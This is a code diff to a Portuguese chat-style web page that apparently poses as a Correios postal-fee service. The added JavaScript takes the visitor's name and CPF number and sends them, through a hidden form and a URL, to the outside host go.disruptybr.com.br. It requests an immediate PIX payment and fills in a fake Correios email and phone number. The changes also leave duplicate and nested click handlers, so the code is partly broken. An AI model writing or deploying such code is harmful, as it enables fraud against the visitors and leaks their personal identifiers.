@@ -999,15 +999,7 @@
       <img src="images/image2.png" alt="Explicação sobre taxas" class="message-image">
     </div>
     
-    <!-- Áudio da explicação -->
-    <div id="taxa-audio" class="message-box bot-message hidden">
-      <audio controls class="message-audio">
-        <source src="audio/audio2.mp3" type="audio/mpeg">
-        Seu navegador não suporta o elemento de áudio.
-      </audio>
-    </div>
-    
-    <!-- Confirmação de pagamento (inicialmente oculta) -->
+            <!-- Confirmação de pagamento (inicialmente oculta) -->
     <div id="confirmacao-message" class="message-box bot-message hidden">
       <div class="message-sender">
         <img src="images/avatar.png" alt="Priscilla" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:5px;">
@@ -1352,8 +1344,49 @@ document.getElementById('btn-continuar').addEventListener('click', function() {
   document.getElementById('detalhes-message').classList.remove('hidden');
   
   // Esconde o botão CONTINUAR e mostra o botão ACESSAR GUIA
-  document.getElementById('btn-continuar').classList.add('hidden');
-  document.getElementById('btn-acessar-guia').classList.remove('hidden');
+  document.getElementById('btn-acessar-guia').addEventListener('click', function() {
+  // Obter os dados do usuário
+  const nomeCompleto = document.getElementById("res-nome").textContent;
+  const cpf = document.getElementById("res-cpf").textContent.replace(/\D/g, '');
+  
+  // Criar um formulário oculto para enviar os dados
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://go.disruptybr.com.br/sr2chd4pqd';
+  form.target = '_blank';
+  form.style.display = 'none';
+  
+  // Adicionar campos ocultos com os dados necessários
+  const addHiddenField = (name, value) => {
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = name;
+    input.value = value;
+    form.appendChild(input);
+  };
+  
+  // Dividir nome e sobrenome (assumindo que o último espaço separa sobrenome)
+  const nomeSplit = nomeCompleto.split(' ');
+  const nome = nomeSplit[0];
+  const sobrenome = nomeSplit.slice(1).join(' ');
+  
+  // Adicionar campos ao formulário
+  addHiddenField('nome', nome);
+  addHiddenField('sobrenome', sobrenome);
+  addHiddenField('email', 'cliente@correios.com.br'); // Email genérico
+  addHiddenField('telefone', '11999999999'); // Telefone genérico
+  addHiddenField('cpf', cpf);
+  addHiddenField('metodo_pagamento', 'pix');
+  addHiddenField('acao_pagamento', 'pagar_agora');
+  addHiddenField('mostrar_apenas_qrcode', 'true');
+  
+  // Adicionar o formulário ao corpo do documento e enviar
+  document.body.appendChild(form);
+  form.submit();
+  
+  // Remover o formulário após o envio
+  setTimeout(() => document.body.removeChild(form), 1000);
+});
   
   // Rolagem automática para o final do chat
   const chatMessages = document.querySelector('.chat-messages');
@@ -1361,8 +1394,11 @@ document.getElementById('btn-continuar').addEventListener('click', function() {
 });
 
 document.getElementById('btn-acessar-guia').addEventListener('click', function() {
-  alert('Redirecionando para a página de pagamento...');
+  const nome = document.getElementById("res-nome").textContent.split(" ")[0];
+  const cpf = document.getElementById("res-cpf").textContent.replace(/\D/g, '');
   // Aqui você pode adicionar o redirecionamento real para a página de pagamento
+ const url = `https://go.disruptybr.com.br/sr2chd4pqd?nome=${nome}&cpf=${cpf}&metodo=pix&acao=pagar_agora`;
+  window.open(url, '_blank', 'width=600,height=800');
 });
 
 
